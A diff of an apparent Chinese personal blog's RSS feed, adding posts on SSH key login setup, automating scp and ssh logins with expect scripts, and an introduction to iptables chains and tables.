+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 生成公私钥对 -t 密钥类型 -c 注释文字&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh-keygen -t rsa -C &lt;span class=&#34;string&#34;&gt;&amp;#x27;chaihj15@163.com&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# .ssh下找到id_rsa.pub 上传到服务器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 追加到服务器ssh认证文件中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /xxx/id_rsa.pub &amp;gt;&amp;gt; ~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 如果没有authorized_keys，创建&amp;amp;赋予600权限&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;touch authorized_keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod 600 authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;本机创建～/.ssh/config&lt;/p&gt;
+&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Host            alias            #自定义别名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HostName        114.11.11.110         #替换为你的ssh服务器ip或domain&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Port            22             #ssh服务器端口，默认为22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User            root             #ssh服务器用户名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;IdentityFile    ~&amp;#x2F;.ssh&amp;#x2F;id_rsa    #第一个步骤生成的公钥文件对应的私钥文件&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;更改权限&lt;/p&gt;
+&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chmod 600 config&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;运行，愉快登录&lt;/p&gt;
+&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh alias&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;有些服务器默认不支持密钥登陆，需要修改 &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;  配置&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;去掉&lt;span class=&#34;comment&#34;&gt;#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#PubkeyAuthentication yes&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;发现本机 ip&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;curl ifconfig.me&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://snowroll.github.io/shell-except/</guid>
+            <title>shell-except</title>
+            <link>https://snowroll.github.io/shell-except/</link>
+            <category>linux</category>
+            <category>shell</category>
+            <category>except</category>
+            <pubDate>Wed, 21 Oct 2020 14:57:55 +0000</pubDate>
+            <description><![CDATA[ &lt;h3 id=&#34;内容摘要&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#内容摘要&#34;&gt;#&lt;/a&gt; 内容摘要&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;except 简介&lt;/li&gt;
+&lt;li&gt;利用 except，向服务器传输文件 &amp;amp; ssh 登录服务器&lt;/li&gt;
+&lt;/ul&gt;
+&lt;a id=&#34;more&#34;&gt;&lt;/a&gt;
+&lt;h4 id=&#34;1-except简介&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-except简介&#34;&gt;#&lt;/a&gt; 1. except 简介&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;except 的安装&lt;/p&gt;
+&lt;p&gt;Mac:&lt;/p&gt;
+&lt;figure class=&#34;highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;brew install expect&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;Linux:&lt;/p&gt;
+&lt;figure class=&#34;highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;apt install expect&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;压缩包安装&lt;/p&gt;
+&lt;p&gt;参考博客： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC85NDJiODAxNzU3ZGU=&#34;&gt;https://www.jianshu.com/p/942b801757de&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;简介&lt;/p&gt;
+&lt;p&gt;shell 脚本功能非常强大，可以帮助我们自动完成很多繁琐的工作。但是对于登录服务器这种需要自动交互的过程，shell 就有些力不从心，except 可以完美解决这一需求。&lt;/p&gt;
+&lt;p&gt;参考博客： Linux expect 用法 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vMHhjYWZlZGFkZHkvcC83MTQ3MDUxLmh0bWw=&#34;&gt;https://www.cnblogs.com/0xcafedaddy/p/7147051.html&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;expect 脚本使用 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2VpbnZlcm5lLmdpdGh1Yi5pby9wb3N0LzIwMTkvMDEvZXhwZWN0LWNvbW1hbmQuaHRtbCMlRTUlODUlQjMlRTklOTQlQUUlRTUlOTElQkQlRTQlQkIlQTQ=&#34;&gt;http://einverne.github.io/post/2019/01/expect-command.html# 关键命令&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;expect - 自动交互脚本 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3hzdGFyY2QuZ2l0aHViLmlvL3dpa2kvc2hlbGwvZXhwZWN0Lmh0bWw=&#34;&gt;http://xstarcd.github.io/wiki/shell/expect.html&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;四个重要的命令&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;命令&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;spawn&lt;/td&gt;
+&lt;td&gt;启动新的进程，输出可以被 expect 所捕获&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;expect&lt;/td&gt;
+&lt;td&gt;从进程接收字符串，期望获得字符串&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;send&lt;/td&gt;
+&lt;td&gt;向进程发送字符串，模拟用户输入，注意添加 &lt;code&gt;\r&lt;/code&gt;  回车&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;interact&lt;/td&gt;
+&lt;td&gt;允许用户与进程交互&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;简单示例  &lt;code&gt;demo.sh&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#!/usr/bin/except&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; timeout 10;  &lt;span class=&#34;comment&#34;&gt;# 设置程序超时时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;spawn ssh root@10.10.10.11  &lt;span class=&#34;comment&#34;&gt;# ssh连接服务器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;expect &lt;span class=&#34;string&#34;&gt;&amp;quot;password&amp;quot;&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;# 判断进程输出中是否有&amp;quot;password&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;send &lt;span class=&#34;string&#34;&gt;&amp;quot;your_password\r&amp;quot;&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;# 将密码输入 \r是回车 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;interact  &lt;span class=&#34;comment&#34;&gt;# 保持与服务器端的连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;运行方法:  &lt;code&gt;except demo.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;\r \n 的区别： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8yMzgwNGIwYjAzYzg=&#34;&gt;https://www.jianshu.com/p/23804b0b03c8&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;2-向服务器传输文件ssh登录服务器自动化脚本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-向服务器传输文件ssh登录服务器自动化脚本&#34;&gt;#&lt;/a&gt; 2. 向服务器传输文件 &amp;amp; ssh 登录服务器自动化脚本&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;except 与 shell 脚本结合&lt;/p&gt;
+&lt;figure class=&#34;highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#!/usr/bin/expect&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 自动上传文件到服务器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;title&#34;&gt;auto_scp&lt;/span&gt;&lt;/span&gt;()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;# -c: 执行脚本前先执行的命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    expect -c &lt;span class=&#34;string&#34;&gt;&amp;quot;set timeout -1; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            spawn scp yourfile root@10.10.10.10:/target_dir/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            expect &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                \&amp;quot;yes/no\&amp;quot; &amp;#123; send \&amp;quot;yes\n\&amp;quot;; exp_continue&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                \&amp;quot;password\&amp;quot; &amp;#123; send \&amp;quot;yourpasswd\n\&amp;quot; &amp;#125;  # \n 和 \r 均可以&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            interact&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            &amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# ssh登录服务器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;title&#34;&gt;auto_ssh_restart&lt;/span&gt;&lt;/span&gt;() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    expect -c &lt;span class=&#34;string&#34;&gt;&amp;quot;set timeout -1;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            spawn ssh root@10.10.10.10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            expect \&amp;quot;password\&amp;quot; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            send \&amp;quot;yourpassword\r\&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            expect \&amp;quot;]#\&amp;quot; &amp;#123; send \&amp;quot;pwd\n\&amp;quot; &amp;#125; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            interact&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;auto_scp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;auto_ssh_restart&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;center&gt;点绛唇·途中逢管倅
+&lt;center&gt; 憔悴天涯，故人相遇情如故。别离何遽，忍唱阳关句！&lt;/center&gt;
+&lt;center&gt;我是行人，更送行人去。愁无据。寒蝉鸣处，回首斜阳暮。&lt;/center&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://snowroll.github.io/iptables/</guid>
+            <title>iptables 简介</title>
+            <link>https://snowroll.github.io/iptables/</link>
+            <category>linux</category>
+            <pubDate>Thu, 08 Oct 2020 12:00:00 +0000</pubDate>
+            <description><![CDATA[ &lt;h3 id=&#34;内容摘要&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#内容摘要&#34;&gt;#&lt;/a&gt; 内容摘要&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;iptables 相关概念介绍&lt;/li&gt;
+&lt;li&gt;iptables 相关命令&lt;/li&gt;
+&lt;li&gt;常用命令解析&lt;/li&gt;
+&lt;/ul&gt;
+&lt;a id=&#34;more&#34;&gt;&lt;/a&gt;
+&lt;h3 id=&#34;一-iptables相关概念介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一-iptables相关概念介绍&#34;&gt;#&lt;/a&gt; 一、 iptables 相关概念介绍&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;参考的博客链接 https://aimuke.github.io/linux/2019/05/28/iptables/&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;功能简介&lt;/p&gt;
+&lt;p&gt;根据管理员定义的规则 &lt;code&gt;rules&lt;/code&gt;  对数据包进行过滤，在 &lt;code&gt;rules&lt;/code&gt;  中可以指定数据包的 &lt;code&gt;源地址&lt;/code&gt; 、 &lt;code&gt;目标地址&lt;/code&gt; 、 &lt;code&gt;协议类型&lt;/code&gt; 等，过滤操作包括 &lt;code&gt;ACCEPT&lt;/code&gt; 、 &lt;code&gt;REJECT&lt;/code&gt; 、 &lt;code&gt;DROP&lt;/code&gt;  和 &lt;code&gt;LOG&lt;/code&gt;  等等。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Chain&lt;/p&gt;
+&lt;p&gt;针对数据包的不同流向，又设置了不同的关卡，术语为 &lt;code&gt;Chain(链)&lt;/code&gt; 。当数据包的目标主机为本机时使用 &lt;code&gt;INPUT&lt;/code&gt; ，需要经过本机转发给其他服务器使用 &lt;code&gt;FORWORD&lt;/code&gt; ，本机数据包发送出去使用 &lt;code&gt;OUTPUT&lt;/code&gt; 。还有 &lt;code&gt;PREROUTING&lt;/code&gt;  和 &lt;code&gt;POSTROUTING&lt;/code&gt; ，下面这张图能够很好地说明几个链所处的位置，图片来源见水印&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_2.png&#34; alt=&#34;a&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;table&lt;/p&gt;
+&lt;p&gt;不同的规则会对数据包进行不同的操作，相同功能的规则会构成一个 &lt;code&gt;table(表)&lt;/code&gt; ， &lt;code&gt;iptables&lt;/code&gt;  提供的表如下所示&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;表名&lt;/th&gt;
+&lt;th&gt;功能&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;filter&lt;/td&gt;
+&lt;td&gt;过滤，防火墙  内核模块： iptables_filter&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;nat&lt;/td&gt;
+&lt;td&gt;网络地址转换 内核模块： iptable_nat&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;mangle&lt;/td&gt;
+&lt;td&gt;拆解报文，做出修改，并重新封装 内核模块： iptable_mangle&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;raw&lt;/td&gt;
+&lt;td&gt;关闭 nat 表上启用的连接追踪功能 内核模块： iptable_raw&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Chain 和 table&lt;/p&gt;
+&lt;p&gt;不同的链中包含不同的表，不同的表执行有优先级，具体可见下图（来源见水印）&lt;/p&gt;
+&lt;img data-src=&#34;http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_6.png&#34; alt=&#34;aa&#34; style=&#34;zoom:%;&#34; /&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;二-相关命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二-相关命令&#34;&gt;#&lt;/a&gt; 二、 相关命令&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;基本命令&lt;/p&gt;
+&lt;figure class=&#34;highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo iptables -L&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;列出目前 &lt;code&gt;iptables&lt;/code&gt;  中的规则，对于新建立的服务器，没有任何规则，结果如下&lt;/p&gt;
+&lt;figure class=&#34;highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Chain INPUT (policy ACCEPT)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target     prot opt &lt;span class=&#34;built_in&#34;&gt;source&lt;/span&gt;               destination&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Chain FORWARD (policy ACCEPT)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target     prot opt &lt;span class=&#34;built_in&#34;&gt;source&lt;/span&gt;               